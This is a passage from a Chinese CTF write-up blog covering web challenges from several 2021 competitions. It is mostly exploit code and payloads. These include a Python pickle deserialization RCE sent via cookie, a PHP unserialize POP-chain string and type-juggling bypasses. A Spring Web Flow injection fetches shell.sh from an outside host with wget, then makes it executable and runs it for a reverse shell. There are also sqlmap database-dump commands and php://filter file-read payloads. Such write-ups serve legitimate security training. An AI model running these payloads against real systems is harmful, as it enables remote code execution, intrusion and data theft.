    pic <span class="token operator">=</span> <span class="token string">'{0}.jpg'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        pic<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'pic'</span><span class="token punctuation">)</span>
        <span class="token keyword">with</span> open<span class="token punctuation">(</span>pic<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            base64_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            p <span class="token operator">=</span> base64_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        pic<span class="token operator">=</span><span class="token string">'{0}.jpg'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">with</span> open<span class="token punctuation">(</span>pic<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            base64_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            p <span class="token operator">=</span> base64_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> uname<span class="token operator">=</span>username<span class="token punctuation">,</span> pic<span class="token operator">=</span>p <span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">)</span></code></pre>
<h5 id="paylaod"><a href="#paylaod" class="headerlink" title="paylaod"></a>paylaod</h5><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> base64
<span class="token comment" spellcheck="true">#e = 'ls / -a'</span>
e <span class="token operator">=</span> <span class="token string">'cat /flagggggggggggggaaa'</span>
s <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># print(s)</span>
payload <span class="token operator">=</span> b<span class="token string">'c__main__\nUser\n)\x81}(V__setstate__\ncos\nsystem\nubV'</span> <span class="token operator">+</span> \
    e<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">' > /tmp/1.txt\nb.'</span>
response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://eci-2zedqu5w4d2328dulcrt.cloudeci1.ichunqiu.com:8888/?pic=/tmp/1.txt"</span><span class="token punctuation">,</span>
cookies<span class="token operator">=</span>dict<span class="token punctuation">(</span>
    user<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
<span class="token keyword">for</span> l <span class="token keyword">in</span> response<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">"base64"</span> <span class="token keyword">in</span> l<span class="token punctuation">:</span>
        l <span class="token operator">=</span> l<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\""</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h2 id="java-url"><a href="#java-url" class="headerlink" title="java_url"></a>java_url</h2><pre><code>testURL?url=url:file:///flag</code></pre>
]]></content>
  </entry>
  <entry>
    <title>陇原战疫2021</title>
    <url>/2021/11/15/long-yuan-zhan-yi-2021/</url>
    <content><![CDATA[<h1 id="eaaasyphp"><a href="#eaaasyphp" class="headerlink" title="eaaasyphp"></a>eaaasyphp</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name">Check</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$str2</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">class</span> <span class="token class-name">Esle</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Check<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


<span class="token keyword">class</span> <span class="token class-name">Hint</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token string">"no hint"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token string">"phpinfo"</span><span class="token punctuation">;</span>
            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


<span class="token keyword">class</span> <span class="token class-name">Bunny</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>Check<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$str2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Welcome</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Check<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$str2</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"Welcome"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Bypass</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>Check<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$str1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str4</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre><code>?code=O%3A6%3A%22Bypass%22%3A2%3A%7Bs%3A4%3A%22str4%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A4%3A%22H3ng%22%3BO%3A4%3A%22Esle%22%3A0%3A%7B%7D%7D</code></pre>
]]></content>
      <tags>
        <tag>比赛</tag>
      </tags>
  </entry>
  <entry>
    <title>鹤城杯2021</title>
    <url>/2021/10/08/he-cheng-bei-2021/</url>
    <content><![CDATA[<h1 id="MIDDLE-MAGIC"><a href="#MIDDLE-MAGIC" class="headerlink" title="MIDDLE_MAGIC"></a>MIDDLE_MAGIC</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span> <span class="token string">"./flag.php"</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span> <span class="token string">"./result.php"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

        <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/^(.*)level(.*)$/'</span><span class="token punctuation">,</span> <span class="token string">'${1}&lt;!-- filtered -->${2}'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/pass_the_level_1#/'</span><span class="token punctuation">,</span> <span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"here is level 2"</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                    <span class="token keyword">echo</span> <span class="token string">'&lt;p>The level 2 can not pass!&lt;/p>'</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">// START FORM PROCESSING    </span>
                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                    <span class="token keyword">echo</span> <span class="token string">"here is level 3,do you kown how to overcome it?"</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level_3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token variable">$level_3</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level_3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$level_3</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">result</span> <span class="token operator">==</span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                            <span class="token keyword">echo</span> <span class="token string">"success:"</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                        <span class="token keyword">else</span> <span class="token punctuation">{</span>
                            <span class="token keyword">echo</span> <span class="token string">"you never beat me!"</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                    <span class="token keyword">else</span><span class="token punctuation">{</span>
                        <span class="token keyword">echo</span> <span class="token string">"out"</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">else</span><span class="token punctuation">{</span>

                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token comment" spellcheck="true">// perform validations on the form data</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span><span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token string">'&lt;p>out!&lt;/p>'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

        <span class="token punctuation">}</span>

        <span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'nonono!'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">echo</span> <span class="token string">'&lt;hr>'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token delimiter">?></span> </code></pre>
<ul>
<li>%0a绕过preg_replace</li>
<li>数组绕过sha1</li>
<li>若比较=0绕过json_decode</li>
</ul>
<p><strong>payload</strong></p>
<pre><code>?aaa=%0apass_the_level_1#
POST:
admin[]=1&amp;root_pwd[]=2&amp;level_3={"result":0}</code></pre>
<h1 id="EASYP"><a href="#EASYP" class="headerlink" title="EASYP"></a>EASYP</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">'utils.php'</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$guess</span> <span class="token operator">===</span> <span class="token variable">$secret</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Congratulations! The flag is: '</span> <span class="token punctuation">.</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Wrong. Try Again'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/utils\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"hacker :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/show_source/'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"hacker :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'show_source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span> </code></pre>
<p> 大E了太久了忘了：</p>
<p>原题：<a href="https://buuoj.cn/challenges#[ISITDTU%202019]EasyPHP">https://buuoj.cn/challenges#[ISITDTU%202019]EasyPHP</a></p>
<p><a href="https://www.gem-love.com/ctf/1898.html">https://www.gem-love.com/ctf/1898.html</a></p>
<p><code>basename()</code> 是为了跨目录读文件</p>
<pre><code>#Author:颖奇L'Amore www.gem-love.com
import requests
for i in range (0,500):
    url = 'http://3.112.201.75:8003/index.php/config.php/{}?source'.format(hex(i).replace('0x', '%'))
    r = requests.get(url)
    if r"zer0pts" in r.text:
        print(url)
        print(r.content)
        break</code></pre>
<pre><code>%81?%73%68%6f%77%5f%73%6f%75%72%63%65=1</code></pre>
<h1 id="Spring-Xman2017原题"><a href="#Spring-Xman2017原题" class="headerlink" title="Spring(Xman2017原题)"></a>Spring(Xman2017原题)</h1><p>反弹shell</p>
<p><a href="http://blog.cyberpeace.cn/Spring-Web-Flow/">http://blog.cyberpeace.cn/Spring-Web-Flow/</a></p>
<p>1.点击页面中的超链接进入图书搜索页面，在页面中输入搜索内容进行搜索</p>
<p><img src="/2021/10/08/he-cheng-bei-2021/1.png" alt="1"></p>
<p>2.搜索到图书点击View hotel按钮，然后点击Book hotel按钮，如果没有登录请先登录（登录名密码圈出来了，4种任意都可以登录）</p>
<p><img src="/2021/10/08/he-cheng-bei-2021/2.png" alt="2"></p>
<p>3.进入借书页面，随意写入16位Credit Card id和Credit Card Name点击Process按钮</p>
<p><img src="/2021/10/08/he-cheng-bei-2021/3.png" alt="3"></p>
<p>4.在点击Confirm按钮前我们需要进行burpsuite进行拦截抓包，截获数据包send to repeater，篡改数据包添加恶意payload：<code>&amp;_(new+java.lang.ProcessBuilder("/usr/bin/wget","-P/tmp","http://192.168.159.128/shell.sh")).start()=feifei</code>，shell.sh放在可以访问的服务器中，执行请求包。</p>
<p><img src="/2021/10/08/he-cheng-bei-2021/4.png" alt="4"></p>
<p>5.查看自己虚拟机的/tmp目录下有没有成功下shell.sh,可以看到shell.sh成功下载</p>
<p><img src="/2021/10/08/he-cheng-bei-2021/5.png" alt="5"></p>
<p>6.至此已经复现了漏洞，可是我们既然想代码执行，那我们就可以进行反弹shell操作，继续执行命令，添加payload：<code>&amp;_(new+java.lang.ProcessBuilder("/bin/chmod","777","/tmp/shell.sh")).start()=feifei</code>对shell.sh修改权限</p>
<p><img src="/2021/10/08/he-cheng-bei-2021/6.png" alt="6"></p>
<p>7.查看虚拟机中的/tmp目录下的shell.sh有没有变成可读可写可执行权限，可以看到shell.sh权限成功变成777</p>
<p><img src="/2021/10/08/he-cheng-bei-2021/7.png" alt="7"></p>
<p>8.执行shell.sh文件同时监听2333端口，执行payload:<code>&amp;_(new+java.lang.ProcessBuilder("/bin/bash","/tmp/shell.sh")).start()=feifei</code></p>
<p><img src="/2021/10/08/he-cheng-bei-2021/8.png" alt="8"></p>
<p><img src="/2021/10/08/he-cheng-bei-2021/9.png" alt="9"></p>
<p>9.在监听的服务器中查看监听的2333端口有没有反弹shell，可以看到成功反弹shell，可以执行权限内任意命令。 </p>
<p><img src="/2021/10/08/he-cheng-bei-2021/10.png" alt="10"></p>
<h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>  升级Spring Web Flow版本到4.2.5</p>
]]></content>
  </entry>
  <entry>
    <title>鲲鹏杯2021</title>
    <url>/2021/10/17/kun-peng-bei-2021/</url>
    <content><![CDATA[<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="Web1：贪吃蛇"><a href="#Web1：贪吃蛇" class="headerlink" title="Web1：贪吃蛇"></a>Web1：贪吃蛇</h2><p>Dirsearch: /js/snack.js</p>
<p>有一串js判断丢到控制台运行</p>
<p>点击报错发现DOM树</p>
<h2 id="Web2：SQL"><a href="#Web2：SQL" class="headerlink" title="Web2：SQL"></a>Web2：SQL</h2><p>sqlmap</p>
<pre><code>sqlmap -u "http://172.31.65.174/search.jsp?keyname=" --dbs 
sqlmap -u "http://172.31.65.174/search.jsp?keyname=" -D attackdb --tables 
sqlmap -u "http://172.31.65.174/search.jsp?keyname=" -D attackdb --tables -T db_news 
sqlmap -u "http://172.31.65.174/search.jsp?keyname=" -D attackdb --tables -T db_news --columns 
sqlmap -u "http://172.31.65.174/search.jsp?keyname=" -D attackdb --tables -T db_news --columns -C flag --dump</code></pre>
<h2 id="Web3：可视化监控管理"><a href="#Web3：可视化监控管理" class="headerlink" title="Web3：可视化监控管理"></a>Web3：可视化监控管理</h2><p>Dirsearch: /index.php/login/</p>
<p>访问发现后台index.php?page=index</p>
<pre><code>index.php?page=php://filter/convert.base64-encode/resource=index.php</code></pre>
<p>not the base 应该是过滤了 base</p>
<pre><code>index.php?page=php://filter/read=string.rot13/resource=index.php</code></pre>
<p>查看源码就有密文，解密得到源码：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token variable">$hashed_key</span> <span class="token operator">=</span> <span class="token string">'df01c5786c5d7d83211a8f5f22f6bdb8468e23494ad698cb86c02d128473beef765952cdd5504cbe4657a6334f6b4f7b'</span><span class="token punctuation">;</span>


    <span class="token variable">$parsed</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//parse_url将url解析后，返回一个关联数组，数组中包含query这个字段，用来存储传入的参数值。</span>

    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$parsed</span><span class="token punctuation">[</span><span class="token string">"query"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//[query] => arg=value，将数组中的query字段值赋给变量query</span>


    <span class="token variable">$parsed_query</span> <span class="token operator">=</span> <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量</span>
    <span class="token comment" spellcheck="true">//parse_str将字符串解析成多个变量</span>

    <span class="token comment" spellcheck="true">//所有通过url的get方法传入的参数都会经过parse_str方法。使传入的参数值覆盖之前赋的值，从而引发变量覆盖漏洞</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$parsed_query</span><span class="token operator">!=</span><span class="token keyword">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$parsed_query</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">===</span><span class="token string">"auth"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                         <span class="token comment" spellcheck="true">//$action="auth";</span>
        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"key"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//传入参数为key</span>
        <span class="token variable">$hashed_input</span> <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token string">'sha384'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//使用sha384的哈希算法，将key值进行hash运算，生成对应的哈希值 </span>
